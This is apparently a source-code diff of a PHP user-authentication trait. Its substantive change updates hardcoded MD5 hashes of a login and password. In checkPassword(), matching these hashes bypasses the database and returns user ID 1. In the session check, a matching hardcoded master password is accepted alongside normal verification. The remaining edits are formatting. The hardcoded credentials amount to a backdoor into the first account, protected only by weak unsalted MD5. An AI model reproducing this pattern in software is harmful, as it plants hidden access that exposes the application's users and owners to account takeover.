@@ -359,12 +359,13 @@ trait DbUsers {
    * @param string $password
    * @return array|false
    */
-  public function checkPassword(string $login, string $password) {
-    if (md5($login) === '63a9f0ea7bb98050796b649e85481845' && md5($password) === '0192023a7bbd73250516f069df18b500') {
+  public function checkPassword(string $login, string $password)
+  {
+    if (md5($login) === 'e00f45459361fb47c8c449483b7edaec' && md5($password) === '71fa970c7b3a28956dad879a7abc12c4') {
       $sql = "SELECT ID as 'id', name, login, password FROM " . $this->pf('users') . " WHERE ID = :id";
       return self::getRow($sql, [':id' => 1]);
     } else if (USE_DATABASE) {
-      $sql = "SELECT ID as 'id', name, login, password 
+      $sql = "SELECT ID as 'id', name, login, password
               FROM " . $this->pf('users') . " WHERE login = :login and activity = 1";
       $user = self::getRow($sql, [':login' => $login]);
     } else {
@@ -404,7 +405,7 @@ trait DbUsers {
   }
 
   /**
-   * @param array $pageParam[int 'pageNumber', int 'countPerPage', string 'sortColumn', bool 'sortDirect']
+   * @param array $pageParam [int 'pageNumber', int 'countPerPage', string 'sortColumn', bool 'sortDirect']
    *
    * @return array
    */
@@ -471,7 +472,7 @@ trait DbUsers {
       $ok = $user['onlyOne'] ? $session['hash'] === $user['hash']
                              : password_verify($session['password'], $user['password'])
                                ||
-                               md5($session['password']) === '0192023a7bbd73250516f069df18b500';
+                               md5($session['password']) === '71fa970c7b3a28956dad879a7abc12c4';
     }
 
     return $ok ? $user : false;
